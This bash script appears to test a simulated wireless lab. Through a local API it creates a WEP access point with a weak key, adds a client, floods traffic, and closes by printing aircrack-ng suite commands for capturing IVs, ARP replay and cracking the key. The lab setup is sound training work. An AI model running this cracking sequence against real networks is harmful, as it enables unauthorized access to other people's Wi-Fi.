#!/bin/bash
# Test WEP network creation and attack workflow

set -e

echo "=== Creating WEP Network ==="
# Using 5-char ASCII key (40-bit WEP) - easier to crack for testing
WEP_RESPONSE=$(curl -s -X POST http://127.0.0.1:8000/api/ap \
  -H "Content-Type: application/json" \
  -d '{"ssid": "WEP_TEST", "security": "wep", "password": "crack", "channel": 6}')
echo "$WEP_RESPONSE"

# Check for error
if echo "$WEP_RESPONSE" | grep -q '"detail"'; then
  echo "ERROR: Failed to create AP"
  exit 1
fi

WEP_ID=$(echo "$WEP_RESPONSE" | python3 -c "import sys, json; print(json.load(sys.stdin)['id'])")
echo "WEP AP ID: $WEP_ID"

sleep 3

echo ""
echo "=== Getting AP Info ==="
curl -s "http://127.0.0.1:8000/api/ap/$WEP_ID" | python3 -m json.tool

echo ""
echo "=== Creating Client (WEP requires ssid, security, password) ==="
CLIENT_RESPONSE=$(curl -s -X POST http://127.0.0.1:8000/api/clients \
  -H "Content-Type: application/json" \
  -d "{\"ssid\": \"WEP_TEST\", \"security\": \"wep\", \"password\": \"crack\", \"ap_id\": \"$WEP_ID\"}")
echo "$CLIENT_RESPONSE"

# Check for error
if echo "$CLIENT_RESPONSE" | grep -q '"detail"'; then
  echo "ERROR: Failed to create client"
  exit 1
fi

CLIENT_ID=$(echo "$CLIENT_RESPONSE" | python3 -c "import sys, json; print(json.load(sys.stdin)['client_id'])")
echo "Client ID: $CLIENT_ID"

sleep 5

echo ""
echo "=== Client Status ==="
curl -s "http://127.0.0.1:8000/api/clients/$CLIENT_ID" | python3 -m json.tool

echo ""
echo "=== Starting Aggressive Traffic ==="
curl -s -X POST "http://127.0.0.1:8000/api/ap/$WEP_ID/flood-traffic" | python3 -m json.tool

sleep 3

echo ""
echo "=== Checking Traffic Count ==="
curl -s "http://127.0.0.1:8000/api/clients/$CLIENT_ID" | python3 -c "import sys, json; d=json.load(sys.stdin); print(f'Traffic count: {d.get(\"traffic_count\", 0)}')"

echo ""
echo "=== Monitoring Traffic for 10 seconds ==="
for i in {1..5}; do
  sleep 2
  COUNT=$(curl -s "http://127.0.0.1:8000/api/clients/$CLIENT_ID" | python3 -c "import sys, json; d=json.load(sys.stdin); print(d.get('traffic_count', 0))")
  echo "  Traffic count at ${i}x2s: $COUNT"
done

echo ""
echo "=== Network Info for Attack ==="
AP_INFO=$(curl -s "http://127.0.0.1:8000/api/ap/$WEP_ID")
BSSID=$(echo "$AP_INFO" | python3 -c "import sys, json; print(json.load(sys.stdin).get('bssid', 'N/A'))")
CHANNEL=$(echo "$AP_INFO" | python3 -c "import sys, json; print(json.load(sys.stdin).get('channel', 'N/A'))")
INTERFACE=$(echo "$AP_INFO" | python3 -c "import sys, json; print(json.load(sys.stdin).get('interface', 'N/A'))")

echo "BSSID: $BSSID"
echo "Channel: $CHANNEL"
echo "Interface: $INTERFACE"

echo ""
echo "=== Ready for WEP Attack ==="
echo "To crack this WEP network, run:"
echo "  1. sudo airmon-ng start wlan1"
echo "  2. sudo airodump-ng -c $CHANNEL --bssid $BSSID -w wep_capture wlan1mon"
echo "  3. sudo aireplay-ng -3 -b $BSSID wlan1mon  # ARP replay"
echo "  4. Wait for 10,000+ IVs, then: sudo aircrack-ng wep_capture-01.cap"
echo ""
echo "Password hint: 5-char ASCII key"
